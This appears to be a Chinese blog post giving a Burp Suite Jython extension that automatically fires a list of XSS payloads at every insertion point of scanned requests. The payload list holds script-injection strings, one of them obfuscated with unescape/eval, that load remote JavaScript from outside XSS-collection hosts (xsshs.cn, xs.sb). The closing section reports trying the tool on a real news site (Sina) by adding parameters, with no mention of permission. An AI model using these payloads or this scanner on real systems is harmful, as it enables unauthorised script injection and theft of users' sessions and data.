---
title: xss自动化攻击
top: false
cover: true
toc: true
mathjax: true
tags:
  - 博客
categories:
  - Burp插件---xss自动化攻击
abbrlink: 34407
date: 2021-10-14 20:44:17
password:
summary:
---

> 一个简单的xss自动攻击扫描器

### *payload*

​	![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110142051360.png)

### 实现代码

```python
#coding=UTF-8 
from burp import IBurpExtender
from burp import IScannerCheck
from java.io import PrintWriter
import time

payload_list = [
        "</tExtArEa>'\"><sCRiPt sRC=//xsshs.cn/VZzS></sCrIpT>",
        "</tEXtArEa>'\"><img src=# id=xssyou style=display:none             onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22%2F%2Fxsshs.cn%2FVZzS%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>",
        "<sCrIpt srC=//xs.sb/VZzS></sCRipT>",
        "<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://demo.loca';>",
        "<sCRiPt/SrC=//xsshs.cn/VZzS>",
        "<img sRC=//xsshs.cn/VZzS/xss.jpg>",
]

class BurpExtender(IBurpExtender, IScannerCheck):


    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("Custom scanner checks Xss")

        #获取显示
        stdout = PrintWriter(callbacks.getStdout(), True)
        self.stdout = stdout

        # register ourselves as a custom scanner check
        callbacks.registerScannerCheck(self)

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # 遍历列表
        for payload in payload_list:
            scan_time = str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))
             #分析相应请求获取地址
            scan_url = str(self._helpers.analyzeRequest(baseRequestResponse).getUrl())   
            scan_payload = str(payload)           #payload转换为字符串
            checkRequest = insertionPoint.buildRequest(bytearray(scan_payload))   #重新构造请求
            #java方法显示结果并打印
            self.stdout.println(scan_time + " ------- url:" + scan_url + "Payload:" + scan_payload) 
            #重发请求，获取http服务
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest) 

        # report the issue
        return
```

### 测试结果

新建被动扫描策略，且只加载插件策略![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110142107861.png)

假设测试新浪网，我们随意在它后面增加参数![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110142121091.png)

然后我们可以查看插件中打印出来的信息![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110142121094.png)



​	
